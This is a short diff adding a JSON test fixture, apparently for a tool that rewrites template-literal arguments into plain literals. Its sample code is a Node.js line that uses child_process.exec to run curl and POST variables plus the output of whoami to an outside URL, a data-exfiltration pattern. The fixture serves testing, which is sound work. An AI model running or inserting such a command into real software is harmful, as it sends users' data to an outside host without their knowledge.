@@ -1,0 +1,4 @@
+{
+  "name": "should transform template literal arg who are to template literal to literal",
+  "code": "\n      require('child_process').exec(`curl -X POST -d ${somevar} \"$(whoami)\" ${anotherVar} <URL>/c`);\n    "
+}
